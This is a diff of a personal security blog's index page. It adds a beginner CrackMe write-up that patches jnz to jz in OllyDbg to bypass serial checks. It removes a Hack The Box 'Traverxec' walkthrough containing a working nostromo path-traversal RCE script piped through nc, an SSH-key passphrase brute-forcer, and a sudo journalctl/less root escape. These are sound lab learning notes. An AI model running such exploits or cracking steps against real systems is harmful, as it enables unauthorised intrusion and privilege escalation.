@@ -196,6 +196,212 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2020/02/25/CrackMe-Day1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="River Li">
+      <meta itemprop="description" content="WHU 网络空间安全在读">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="River's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/25/CrackMe-Day1/" class="post-title-link" itemprop="url">CrackMe-Day1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-02-25 21:54:42" itemprop="dateCreated datePublished" datetime="2020-02-25T21:54:42+08:00">2020-02-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-04 15:05:42" itemprop="dateModified" datetime="2020-11-04T15:05:42+08:00">2020-11-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CrackMe/" itemprop="url" rel="index"><span itemprop="name">CrackMe</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>吾爱破解论坛有160个面向新手的CrackMe，这里为了练手准备慢慢做一下WP，这是第一个程序的WP</p>
+<p>下载地址<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-709699-1-1.html">https://www.52pojie.cn/thread-709699-1-1.html</a></p>
+<!--more--->
+
+<h1 id="CrackMe1"><a href="#CrackMe1" class="headerlink" title="CrackMe1"></a>CrackMe1</h1><p>第一道CrackMe</p>
+<p>作者Acid burn</p>
+<h2 id="程序运行状态"><a href="#程序运行状态" class="headerlink" title="程序运行状态"></a>程序运行状态</h2><p>程序打开界面</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225200555397.png" class="">
+
+<p>点击确定后进入程序主界面</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225200747797.png" class="">
+
+<p>点击Serial/Name后进入输入序列号密码的界面，随便输入之后检查会告诉你错误</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225200901134.png" class="">
+
+<p>give up之后又会回到原本的主界面</p>
+<p>另一个Serial是一个另外的序列号，也就是说一个程序中有两个序列号</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225200944116.png" class="">
+
+<p>下面开始逆向</p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="Serial-With-Name"><a href="#Serial-With-Name" class="headerlink" title="Serial With Name"></a>Serial With Name</h3><p>首先用OD打开，对API下断点，断在MessageBox相关的弹窗中</p>
+<p>结果运行发现运行不起来了</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225201938989.png" class="">
+
+<p>堆栈中出现了这样的信息</p>
+<p>很奇怪，专门去论坛看了一下发现其他人没说这种情况，不知道是为啥</p>
+<p>就用win10换成了winxp，之后重新分析就可以了</p>
+<p>在API断点插件里下断点</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225204313676.png" class="">
+
+<p>运行，第一次断在了最初的弹窗，之后输入错误的验证码出现第二次的弹窗</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225205516326.png" class="">
+
+<p>但是发现断的位置断在了user32的库里</p>
+<p>查看堆栈找到前面压栈的地址0042A1A9</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225210150192.png" class="">
+
+<p>断了之后继续单步步过执行，执行一段时间可以看到一块存放字符串的区域</p>
+<p>在这个MessageBoxA上面的Call下断点，查看程序被断时esi中是否是Sorry那个字符串</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225213557948.png" class="">
+
+<p>发现图中所示的这个断点就没有断住了，而且这时看到右边的esi已经是sorry这样的字符串了</p>
+<p>我们首先还是在这个跳转来的开始位置，即这个<code>push ebp</code>下个断点</p>
+<p>查看这时的堆栈，发现跳转来自于0042fb37</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225213757602.png" class="">
+
+<p>跟过去看一下，发现move了这样的字符串</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225213849953.png" class="">
+
+<p>我们再接着向上看</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225214226496.png" class="">
+
+<p>这一部分的代码以及这个条件跳转非常疑似进行判断的代码</p>
+<p>我们尝试将这个jnz修改为jz</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225214335361.png" class="">
+
+<p>可以，直接破解成功了</p>
+<h3 id="Serial-Without-Name"><a href="#Serial-Without-Name" class="headerlink" title="Serial Without Name"></a>Serial Without Name</h3><p>在窗口中随便输入check后，同样还是先断在这个<code>push ebp</code></p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225214627033.png" class="">
+
+<p>看到堆栈这次来自了另外一个地址</p>
+<p>跟过去看一下</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225214716077.png" class="">
+
+<p>结果发现这部分的代码和上面那边的结构类似</p>
+<p>也是一个jnz，我们还是直接改成jz</p>
+<img src="/2020/02/25/CrackMe-Day1/image-20200225214810468.png" class="">
+
+<p>fine，破解成功</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2020/02/22/Docker/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="River Li">
+      <meta itemprop="description" content="WHU 网络空间安全在读">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="River's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/22/Docker/" class="post-title-link" itemprop="url">Docker</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-02-22 22:14:34" itemprop="dateCreated datePublished" datetime="2020-02-22T22:14:34+08:00">2020-02-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2020/02/08/Swift%E5%9F%BA%E7%A1%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1041,227 +1247,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2019/12/03/HTB-Traverxec/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.jpg">
-      <meta itemprop="name" content="River Li">
-      <meta itemprop="description" content="WHU 网络空间安全在读">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="River's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2019/12/03/HTB-Traverxec/" class="post-title-link" itemprop="url">[HTB]Traverxec</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-12-03 19:26:15" itemprop="dateCreated datePublished" datetime="2019-12-03T19:26:15+08:00">2019-12-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Hack-The-Box/" itemprop="url" rel="index"><span itemprop="name">Hack The Box</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>HackTheBox 上面的一台简单的机器，这是自己第一台拿到权限的active机器，很兴奋</p>
-<p>Happy Hacking</p>
-<!--more--->
-
-<h2 id="www-data"><a href="#www-data" class="headerlink" title="www-data"></a>www-data</h2><p>首先nmap扫描发现开了80和22端口</p>
-<p>80端口运行着nostromo服务，并且存在着一个2019年的CVE</p>
-<p>直接使用searchsploit搜索就可以找到</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit nostromo</span><br></pre></td></tr></table></figure>
-
-<p>网上也可以搜相关的EXP</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HOST=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">PORT=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line"><span class="built_in">shift</span> 2</span><br><span class="line">（<span class="built_in">echo</span> -n -e <span class="string">&#x27;POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n&#x27;</span>; \</span><br><span class="line"><span class="built_in">echo</span> -n -e <span class="string">&#x27;Content-Length: 1\r\n\r\necho\necho\n&#x27;</span>; \</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$@</span> 2&gt;&amp;1&quot;</span>) | nc <span class="string">&quot;<span class="variable">$HOST</span>&quot;</span> <span class="string">&quot;<span class="variable">$PORT</span>&quot;</span>\</span><br><span class="line">|sed --quiet --expression <span class="string">&#x27;:S;/^\r$/&#123;n;bP&#125;;n;bS;:P;n;p;bP&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>运行的时候</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp.sh 10.10.10.165 80 ls /var/nostromo/</span><br></pre></td></tr></table></figure>
-
-<p>这样执行命令，之后就相当于获得到了www-data 的权限</p>
-<p>下面需要提权</p>
-<h2 id="david"><a href="#david" class="headerlink" title="david"></a>david</h2><p>在nostromo的文件夹下看到了一个配置文件夹，里面有nhttpd.conf</p>
-<p>文件的内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># MAIN [MANDATORY]</span><br><span class="line"></span><br><span class="line">servername              traverxec.htb</span><br><span class="line">serverlisten            *</span><br><span class="line">serveradmin             david@traverxec.htb</span><br><span class="line">serverroot              &#x2F;var&#x2F;nostromo</span><br><span class="line">servermimes             conf&#x2F;mimes</span><br><span class="line">docroot                 &#x2F;var&#x2F;nostromo&#x2F;htdocs</span><br><span class="line">docindex                index.html</span><br><span class="line"></span><br><span class="line"># LOGS [OPTIONAL]</span><br><span class="line"></span><br><span class="line">logpid                  logs&#x2F;nhttpd.pid</span><br><span class="line"></span><br><span class="line"># SETUID [RECOMMENDED]</span><br><span class="line"></span><br><span class="line">user                    www-data</span><br><span class="line"></span><br><span class="line"># BASIC AUTHENTICATION [OPTIONAL]</span><br><span class="line"></span><br><span class="line">htaccess                .htaccess</span><br><span class="line">htpasswd                &#x2F;var&#x2F;nostromo&#x2F;conf&#x2F;.htpasswd</span><br><span class="line"></span><br><span class="line"># ALIASES [OPTIONAL]</span><br><span class="line"></span><br><span class="line">&#x2F;icons                  &#x2F;var&#x2F;nostromo&#x2F;icons</span><br><span class="line"></span><br><span class="line"># HOMEDIRS [OPTIONAL]</span><br><span class="line"></span><br><span class="line">homedirs                &#x2F;home</span><br><span class="line">homedirs_public         public_www</span><br></pre></td></tr></table></figure>
-
-<p>具体nostromo有一些特性</p>
-<p>在nostromo的man手册中有提到一点，其中的HOMEDIRS下的选项</p>
-<p>有一个功能是可以直接在web中访问到home目录下的用户文件夹</p>
-<p>可以看到配置文件中写道了可以直接访问<code>/home</code>目录</p>
-<p>因此我们在浏览器中直接访问</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.165:80&#x2F;~david&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>实际上访问的目录就是<code>/home/david</code></p>
-<p>在终端中直接尝试查看这个目录下的内容是看不到的（没有读权限）</p>
-<p>但是看到<code>homedirs_public</code>这个值，这个是任何用户都可以直接访问的</p>
-<p>因此直接在终端中</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp.sh 10.10.10.165 80 ls -la /home/david/public_www</span><br></pre></td></tr></table></figure>
-
-<p>在这里面可以找到一个<code>protected-file-area</code></p>
-<p>里面包含了一个<code>tar</code>压缩包</p>
-<p>将这个压缩包解压，里面包含了一个<code>.ssh</code>, 内容为公私钥</p>
-<p>解压这个包的时候使用的命令是</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xf XXXXX.tar -C /tmp</span><br></pre></td></tr></table></figure>
-
-<p>因为直接解压默认的目录是<code>/home</code>下，这个目录我们是没有权限去写的，因此使用<code>-C</code>可以指定目录</p>
-<p>私钥的内容是加密过的，没有办法直接连接，需要首先破解passphrase</p>
-<p>手动写一个脚本来爆破</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> PIPE, Popen</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmdline</span>(<span class="params">command</span>):</span></span><br><span class="line">    proc = subprocess.Popen(str(command), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">    (out, err) = proc.communicate()</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    words = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">&#x27;/usr/share/wordlists/rockyou.txt&#x27;</span>)]</span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    count=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> words:</span><br><span class="line">        strcmd = <span class="string">&quot;openssl rsa -in ~/.ssh/id_rsa -out out.key -passin pass:&quot;</span>+w</span><br><span class="line">        res=cmdline(strcmd)</span><br><span class="line">        <span class="keyword">if</span> res.startswith(<span class="string">&quot;writing&quot;</span>):</span><br><span class="line">                print(<span class="string">&quot;\nThe key is: &quot;</span>+w)</span><br><span class="line">                sys.exit()</span><br><span class="line">        print(str(count)+<span class="string">&quot;/&quot;</span>+str(w))</span><br><span class="line">        count=count+<span class="number">1</span></span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p>就是直接用python对字典中的词进行尝试，破解得到ssh私钥的pass为<code>hunter</code></p>
-<p>下面直接连接，即可获得david的权限</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh david@10.10.10.165</span><br></pre></td></tr></table></figure>
-
-<p>其实也可以使用john来爆破key，首先使用ssh2john将其转换为john可以爆破的内容，之后直接用john和字典就可以</p>
-<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>首先做的事情就是查看david的目录下有没有比较有用的内容</p>
-<p>发现david的目录下的结构</p>
-
-
-<p>这个<code>bin</code>目录下的server-status.sh比较有趣</p>
-
-
-<p>运行这个脚本可以看到</p>
-
-
-<p>发现最后一行是使用了<code>sudo</code>运行<code>journalctl</code>这个程序</p>
-<p>但是却没有需要输入david的密码，因此如果可以获得这个程序本身的权限就可以得到root的权限了</p>
-<p>我们仿照脚本里最后一行运行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span><br></pre></td></tr></table></figure>
-
-<p>这样也不需要输入密码，最后也是进入了<code>sudo</code>权限的<code>less</code>中</p>
-<p>在<code>less</code>中可以类似<code>vim</code>那样使用<code>!</code>来执行外部的程序</p>
-
-
-
-
-<p>done!</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下这个靶机中学到的新知识</p>
-<ol>
-<li>nostromo 存在的漏洞</li>
-<li>nostromo存在一个可以直接用web访问到用户文件夹的特性</li>
-<li>journalctl、less的提权方法</li>
-<li>使用脚本爆破ssh加密key的方法</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2019/12/02/picoCTF2019/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.jpg">
-      <meta itemprop="name" content="River Li">
-      <meta itemprop="description" content="WHU 网络空间安全在读">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="River's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2019/12/02/picoCTF2019/" class="post-title-link" itemprop="url">picoCTF2019</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-12-02 16:25:15" itemprop="dateCreated datePublished" datetime="2019-12-02T16:25:15+08:00">2019-12-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>picoCTF是一个从易到难的ctf平台，题目好像非常多，每道题还有hint；ctf题目的各个层面内容都包含，最近按着顺序在做题，记录一下遇到过的比较有价值的题目。</p>
-<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1329,14 +1318,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">89</span>
+          <span class="site-state-item-count">91</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
